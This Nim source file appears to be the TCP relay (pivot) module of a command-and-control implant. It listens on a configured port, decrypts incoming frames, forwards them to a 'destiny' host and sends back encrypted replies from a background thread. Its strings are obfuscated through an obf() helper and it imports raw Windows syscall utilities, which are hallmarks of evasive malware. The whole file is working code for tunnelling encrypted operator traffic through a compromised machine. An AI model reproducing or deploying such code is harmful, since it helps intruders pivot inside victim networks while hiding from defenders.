import std/json
import std/tables
from std/locks import acquire, release
import ./core
from ./frame import processRelayFrame
import ../../utils/global
import ../../utils/network/tcp
import ../../utils/crypt/transport
from ../../utils/winapi/handlers import sleepMs
import ../../utils/winapi/syscall
from ../execution/core import writeMsg, writeErr

proc relayTcpForwardDestiny(cfg: JsonNode, body: string): string =
  # Forwards the body over tcp to the destiny host
  let host = cfg[obf("destinyHost")].getStr()
  let port = cfg[obf("destinyPort")].getInt()
  var fd = tcpConnect(host, port)
  if fd == 0:
    return ""
  try:
    var enc = cryptEncrypt(body)
    writeFrameSocket(fd, enc)
    enc.setLen(0)
    tcpSetRecvTimeout(fd)
    let wire = readFrameSocket(fd)
    try:
      result = cryptDecrypt(wire)
    except CatchableError:
      result = ""
  finally:
    tcpClose(fd)

proc relayTcpWorker(param: pointer) {.stdcall.} =
  # Here is where the tcp relay worker listens and forwards frames
  let heap = cast[ptr string](param)
  let relayId = heap[]
  dealloc(heap)

  while true:
    relayEnsureLock()
    acquire(relayLock)
    if relayId notin relays:
      relayWorkerParked[relayId] = true
      release(relayLock)
      sleepMs(50)
      continue
    relayWorkerParked[relayId] = false
    let cfg = relayCfg(relays[relayId])
    release(relayLock)

    var listenFd = tcpListen(cfg[obf("listenPort")].getInt())
    if listenFd == 0:
      sleepMs(200)
      continue
    while true:
      if relayShouldStop(relayId):
        break
      let client = tcpAccept(listenFd)
      if client == 0:
        if relayShouldStop(relayId):
          break
        continue
      try:
        tcpSetRecvTimeout(client)
        let wire = readFrameSocket(client)
        if wire.len == 0:
          continue
        var frame = ""
        try:
          frame = cryptDecrypt(wire)
        except CatchableError:
          discard
        if frame.len == 0:
          continue
        let response = processRelayFrame(cfg, frame, relayTcpForwardDestiny)
        frame.setLen(0)
        if response.len > 0:
          var enc = cryptEncrypt(response)
          writeFrameSocket(client, enc)
          enc.setLen(0)
      finally:
        tcpClose(client)

    if listenFd != 0:
      tcpClose(listenFd)

proc relayTcpStart*(relayId: string, cfg: JsonNode, buf: var openArray[char]): int =
  # Starts the tcp relay worker thread
  relayEnsureLock()
  acquire(relayLock)
  let needThread = relayId notin relayWorkerTh or relayWorkerTh[relayId] == nil
  release(relayLock)

  if needThread:
    try:
      let heap = cast[ptr string](alloc0(sizeof(string)))
      heap[] = relayId
      inc bgWorkers
      let th = createThread(cast[pointer](relayTcpWorker), heap)
      if th == nil:
        dec bgWorkers
        dealloc(heap)
        relayMarkStopped(relayId)
        return writeErr(obf("tcp relay start failed"), buf)
      relayEnsureLock()
      acquire(relayLock)
      relayWorkerTh[relayId] = th
      release(relayLock)
    except CatchableError as e:
      relayMarkStopped(relayId)
      return writeErr(obf("tcp relay start failed: ") & e.msg, buf)
  return writeMsg(obf("relay: id=") & relayId & obf(" listening tcp://") & hostTag & obf(":") &
    $cfg[obf("listenPort")].getInt() & obf(" -> ") & cfg[obf("destinyRaw")].getStr(), buf)

relayTcpStartFn = relayTcpStart
